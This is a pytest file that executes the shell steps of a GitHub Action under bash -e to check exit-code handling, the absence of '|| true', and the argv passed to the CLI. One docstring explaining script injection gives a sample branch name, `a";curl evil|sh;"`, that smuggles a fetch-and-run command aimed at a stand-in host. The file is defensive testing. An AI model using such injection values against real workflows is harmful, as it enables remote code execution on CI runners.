"""The Action's shell, executed, in the shell the runner actually uses.

Phase S3 shipped `action.yml` with its gate point marked prepared and
undemonstrated, and then three defects arrived in three pushes. All three were
in the same seam - between this repository and a GitHub Actions runner - and
`make all` on a clean clone reaches none of it, because the thing it does not do
is run a runner. Three defects in one seam is a hole in the gate rather than
three bugs, and a habit of being careful does not survive into a session that
never saw them.

So the `run:` bodies of `action.yml` are extracted and EXECUTED here, under
`bash -e`, which is the shell GitHub gives a composite step and the fact the
worst of the three turned on. What is asserted is the property the Action's
whole contract rests on: **when the tool exits non-zero, the step still records
everything, and the exit code still reaches the job.** That is the direction
that failed in CI while the succeeding direction passed, which is the shape of a
check that would pass by looking only at the happy path.

WHAT IS NOT REPRODUCED HERE, said plainly rather than left to be assumed. This
does not emulate a runner. It does not map composite outputs, evaluate `if:`,
expand `${{ }}` or install anything. It runs the shell, which is where the bugs
were, and the two facts about GitHub's own behaviour that no stub can show - that
a failed composite does not map its outputs, and that `zizmor` ships no
importable module - are held down by the CI job instead, and their ledger
entries name the run rather than a test here.

THE EXTRACTOR IS HAND-WRITTEN AND THAT IS DELIBERATE. `PyYAML` is not in the dev
extras, so a clean `pip install -e ".[dev]"` and every CI job would import it
and fail; it happens to be present on the author's machine, which is exactly the
phase S1.1 defect wearing a different hat. The same argument the package makes
for `jsonc.py` and `miniyaml.py` applies to thirty lines that read block scalars
out of a file this repository writes. `test_the_extractor_found_the_steps_it_
thinks_it_did` is the guard: an extractor that silently returned nothing would
make every assertion below pass over nothing.
"""
from __future__ import annotations

import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest

from actaira import cli
from conftest import REPO_ROOT

ACTION = Path(REPO_ROOT) / "action.yml"
BASH = shutil.which("bash")

# The step bodies this file runs, by the `id:` or `name:` above them.
DIFF_STEP = "diff"
# S105 below is a false positive: "pass" here is the verb in a step name,
# not a credential.
PASSTHROUGH_STEP = "pass the tool's exit code through"  # noqa: S105

BLOCK = re.compile(r"^(\s*)run: \|\s*$")
LABEL = re.compile(r"^\s*(?:- )?(?:id|name): (.+?)\s*$")


def run_blocks(text: str) -> dict[str, str]:
    """{step label: shell body} for every `run: |` block in a workflow file.

    The label is the nearest `id:` or `name:` above the block, with `id:`
    winning because it is the stable handle a workflow refers to. Bodies are
    dedented by the block's own indentation, which is what a YAML block scalar
    means and all of it this needs to understand.
    """
    found: dict[str, str] = {}
    lines = text.splitlines()
    label = "?"
    for index, line in enumerate(lines):
        named = LABEL.match(line)
        if named and not line.lstrip().startswith("#"):
            label = named.group(1)
        opened = BLOCK.match(line)
        if not opened:
            continue
        indent = len(opened.group(1)) + 2
        body: list[str] = []
        for following in lines[index + 1:]:
            if following.strip() and not following.startswith(" " * indent):
                break
            body.append(following[indent:] if len(following) >= indent else "")
        found[label] = "\n".join(body).rstrip() + "\n"
    return found


BLOCKS = run_blocks(ACTION.read_text(encoding="utf-8"))


def executable(body: str) -> str:
    """The body with whole-line comments removed.

    The two assertions at the foot of this file are about what the shell RUNS,
    and `action.yml` argues both rules in prose beside the code they govern - the
    `|| true` test failed on the comment that says there is no `|| true`. A line
    whose first non-space character is `#` is a comment in every shell there has
    ever been, and that is the whole of the parsing this needs: a `#` inside a
    string is still executable text and is deliberately left in.
    """
    return "\n".join(
        line for line in body.splitlines() if not line.lstrip().startswith("#")
    )


def test_the_extractor_found_the_steps_it_thinks_it_did():
    """The guard, and the whole risk in a hand-written reader of somebody's YAML.

    An extractor that stopped matching would return an empty mapping and every
    test below would pass having executed nothing at all.
    """
    assert DIFF_STEP in BLOCKS, f"parsed {sorted(BLOCKS)} out of action.yml"
    assert PASSTHROUGH_STEP in BLOCKS, f"parsed {sorted(BLOCKS)} out of action.yml"
    assert len(BLOCKS) >= 3, sorted(BLOCKS)

    body = BLOCKS[DIFF_STEP]
    assert "actaira --lang" in body, "the diff step does not run the tool"
    assert "actaira-exit-code.txt" in body, "the diff step records no exit code"
    assert BLOCKS[PASSTHROUGH_STEP].count("exit") >= 1


@pytest.fixture
def runner(tmp_path):
    """A directory with a stub `actaira` on PATH and the runner's files named.

    The stub is a shell script that prints and exits with whatever code the test
    asks for. Nothing here installs anything, and nothing reaches the network:
    what is under test is the shell around the tool, not the tool.
    """

    def build(exit_code: int):
        workspace = tmp_path / f"exit-{exit_code}"
        binaries = workspace / "bin"
        binaries.mkdir(parents=True)
        stub = binaries / "actaira"
        stub.write_text(
            f"#!/bin/sh\necho 'a report the stub printed'\nexit {exit_code}\n",
            encoding="utf-8",
            newline="\n",
        )
        stub.chmod(0o755)
        environment = {
            **os.environ,
            "PATH": os.pathsep.join([str(binaries), os.environ.get("PATH", "")]),
            "ACTAIRA_FROM_DIR": "a",
            "ACTAIRA_TO_DIR": "b",
            "ACTAIRA_SARIF": "actaira.sarif",
            "ACTAIRA_LANG": "en",
            "ACTAIRA_BASE": "",
            "ACTAIRA_HEAD": "",
            "ACTAIRA_EVENT_BASE": "",
            "ACTAIRA_EVENT_HEAD": "",
            "GITHUB_OUTPUT": str(workspace / "github_output"),
            "GITHUB_STEP_SUMMARY": str(workspace / "github_step_summary"),
        }
        return workspace, environment

    return build


def bash(body: str, cwd: Path, environment: dict[str, str]) -> subprocess.CompletedProcess:
    """Run a step body exactly as a composite step is run: `bash -e`.

    `-e` and not `bash` alone. GitHub's composite runner invokes
    `/usr/bin/bash -e {0}`, a script cannot turn that off by leaving `-e` out of
    its own `set` line, and a test that ran these bodies under a plain `bash`
    would be green about the one thing that was broken.
    """
    script = cwd / "step.sh"
    script.write_text(body, encoding="utf-8", newline="\n")
    return subprocess.run(
        [BASH, "-e", str(script)],
        cwd=cwd, env=environment, capture_output=True, text=True, timeout=120,
    )


pytestmark = pytest.mark.skipif(
    BASH is None,
    reason="no bash on PATH, so the step bodies cannot be executed; this says NOT "
           "MEASURED rather than passing. The gate runs in WSL and CI runs on "
           "ubuntu, so both cover it.",
)


# ---------------------------------------------------------------------------
# The property the whole Action rests on
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("code", [0, 1, 3])
def test_the_diff_step_records_everything_whatever_the_tool_exits_with(code, runner):
    """DEF-118, and the direction that was broken.

    The step must SUCCEED and record, whatever the tool did; failing the job is
    the next step's business. That split is what makes the exit code readable at
    all, because a composite action that fails does not map its outputs.
    """
    workspace, environment = runner(code)

    result = bash(BLOCKS[DIFF_STEP], workspace, environment)

    assert result.returncode == 0, (
        f"the diff step died when the tool exited {code}, so nothing after the "
        f"tool call ran.\n{result.stdout}\n{result.stderr}"
    )
    assert (workspace / "actaira-exit-code.txt").read_text(encoding="utf-8").strip() == str(code)
    assert f"exit-code={code}" in (workspace / "github_output").read_text(encoding="utf-8")
    assert "a report the stub printed" in (
        workspace / "github_step_summary"
    ).read_text(encoding="utf-8")


@pytest.mark.parametrize("code", [0, 1, 3])
def test_the_exit_code_reaches_the_job_unchanged(code, runner):
    """The other half: the Action fails the job with the tool's own number.

    There is no `|| true` anywhere in `action.yml` and this is what says so in a
    way a rewrite cannot quietly undo.
    """
    workspace, environment = runner(code)
    (workspace / "actaira-exit-code.txt").write_text(f"{code}\n", encoding="utf-8")

    result = bash(BLOCKS[PASSTHROUGH_STEP], workspace, environment)

    assert result.returncode == code, result.stderr


def test_the_check_would_have_caught_the_defect_it_was_written_for(runner):
    """The guard on the guard, and the reason this file exists at all.

    The fix was `|| code=$?`. Take it away and the step must die under `-e` at
    the tool call, before the summary, before `$GITHUB_OUTPUT` and before the
    file - which is exactly what CI reported, and what a test running these
    bodies under a plain `bash` would have called fine.
    """
    broken = BLOCKS[DIFF_STEP].replace(" || code=$?", "")
    assert broken != BLOCKS[DIFF_STEP], "the plant did not apply; the line moved"
    workspace, environment = runner(1)

    result = bash(broken, workspace, environment)

    assert result.returncode != 0, (
        "the step survived without `|| code=$?`, so `bash -e` is not being "
        "exercised and this whole file is checking the wrong shell"
    )
    assert not (workspace / "actaira-exit-code.txt").exists(), (
        "the broken spelling still wrote the exit code, so the assertion above "
        "is not about what it says it is about"
    )


# ---------------------------------------------------------------------------
# What the shell may not contain
# ---------------------------------------------------------------------------


def test_no_step_body_interpolates_a_workflow_expression():
    """`${{ }}` inside a `run:` is text substitution performed before the shell
    sees the script, so a branch named `a";curl evil|sh;"` becomes shell source.

    `zizmor` says this too, in CI. It is said here as well because the suite runs
    on every commit and on a machine with no network, and because a property this
    load-bearing should not depend on one job being reachable.
    """
    for label, body in BLOCKS.items():
        assert "${{" not in executable(body), (
            f"the `{label}` step interpolates a workflow expression into its "
            "shell. Pass it through `env:` instead."
        )


def test_nothing_in_the_action_swallows_a_failure():
    for label, body in BLOCKS.items():
        assert "|| true" not in executable(body), (
            f"the `{label}` step cannot fail, so it is not a check"
        )


def test_the_comment_stripper_does_not_strip_the_code():
    """The guard on the two assertions above: if `executable` returned nothing,
    both would pass over an empty string."""
    body = executable(BLOCKS[DIFF_STEP])

    assert "actaira --lang" in body and "|| code=$?" in body
    assert "# `|| true` anywhere" not in body, "the comment survived the strip"
    assert "|| true" in BLOCKS[DIFF_STEP], (
        "action.yml no longer argues the `|| true` rule in a comment, so this "
        "guard is no longer about anything and the stripper is untested"
    )


# ---------------------------------------------------------------------------
# DEF-123: the argv the step builds has to be one the CLI accepts
# ---------------------------------------------------------------------------
#
# Every test above runs the step against a stub that prints and exits, and a
# stub that swallows ANY argv is why they were all green over a call `actaira
# diff` refuses. `--sarif` was written after `"$@"`, so on the refs branch it
# landed after the `--` that ends option parsing; argparse read it and its path
# as two more refs, and the DOCUMENTED path - `on: pull_request` with no inputs
# - exited 2 on every pull request that ever used it.
#
# So this one does not stub the judgement. The stub RECORDS the argv and the
# real CLI decides, over real inputs: a git repository with two commits for the
# refs branch, two directories for the other. One definition of "an argv `diff`
# accepts", and it is the one a user gets.

RECORD = "ACTAIRA_ARGV_RECORD"


def _recording_stub(binaries: Path) -> None:
    """A stub that writes its arguments, one per line, and says nothing else.

    Shell and not Python: this runs under whatever `bash` is on PATH, and a
    Python interpreter path quoted into a shell script is one more thing to get
    wrong on the platform where the shell is not the system's own.
    """
    binaries.mkdir(parents=True, exist_ok=True)
    stub = binaries / "actaira"
    stub.write_text(
        "#!/bin/sh\n"
        f': > "${RECORD}"\n'
        f'for argument in "$@"; do printf \'%s\n\' "$argument" >> "${RECORD}"; done\n'
        "echo 'a report the stub printed'\n",
        encoding="utf-8",
        newline="\n",
    )
    stub.chmod(0o755)


def _git(where: Path, *arguments: str) -> str:
    done = subprocess.run(["git", *arguments],  # noqa: S607 - git from PATH, as diff.py runs it
                          cwd=where, check=True,
                          capture_output=True, text=True, timeout=120)
    return done.stdout.strip()


@pytest.mark.skipif(shutil.which("git") is None, reason="no git on PATH")
@pytest.mark.parametrize("branch", ["dirs", "refs"])
def test_the_argv_the_step_builds_is_one_the_cli_accepts(branch, tmp_path, monkeypatch):
    """DEF-123, over BOTH branches, because only one was ever exercised.

    CI's `action` job passes `from-dir`, which is the branch a stranger does not
    use, and the branch nobody ran is the branch that was broken.
    """
    workspace = tmp_path / branch
    workspace.mkdir()
    record = workspace / "argv.txt"
    _recording_stub(workspace / "bin")
    environment = {
        **os.environ,
        "PATH": os.pathsep.join([str(workspace / "bin"), os.environ.get("PATH", "")]),
        RECORD: str(record),
        "ACTAIRA_FROM_DIR": "", "ACTAIRA_TO_DIR": "",
        "ACTAIRA_BASE": "", "ACTAIRA_HEAD": "",
        "ACTAIRA_EVENT_BASE": "", "ACTAIRA_EVENT_HEAD": "",
        "ACTAIRA_SARIF": str(workspace / "actaira.sarif"),
        "ACTAIRA_LANG": "en",
        "GITHUB_OUTPUT": str(workspace / "github_output"),
        "GITHUB_STEP_SUMMARY": str(workspace / "github_step_summary"),
    }

    if branch == "dirs":
        for name in ("a", "b"):
            (workspace / name).mkdir()
        environment["ACTAIRA_FROM_DIR"] = str(workspace / "a")
        environment["ACTAIRA_TO_DIR"] = str(workspace / "b")
    else:
        _git(workspace, "init", "--quiet", "-b", "main")
        _git(workspace, "config", "user.email", "gate@example.invalid")
        _git(workspace, "config", "user.name", "gate")
        (workspace / "README.md").write_text("before\n", encoding="utf-8")
        _git(workspace, "add", "README.md")
        _git(workspace, "commit", "--quiet", "-m", "before")
        environment["ACTAIRA_EVENT_BASE"] = _git(workspace, "rev-parse", "HEAD")
        (workspace / "README.md").write_text("after\n", encoding="utf-8")
        _git(workspace, "commit", "--quiet", "-am", "after")
        environment["ACTAIRA_EVENT_HEAD"] = _git(workspace, "rev-parse", "HEAD")

    bash(BLOCKS[DIFF_STEP], workspace, environment)

    assert record.is_file(), "the step never reached the tool"
    argv = record.read_text(encoding="utf-8").splitlines()

    # The real CLI is the judge, over real inputs, in the directory the step ran
    # in: `--repo .` means nothing anywhere else.
    monkeypatch.chdir(workspace)
    code = cli.main(argv)

    assert code != 2, (
        f"the {branch} branch builds an argv `actaira diff` refuses as a usage error: "
        f"{argv}. DEF-123: a stub that accepts anything cannot tell a call the tool "
        "would take from one it would not"
    )
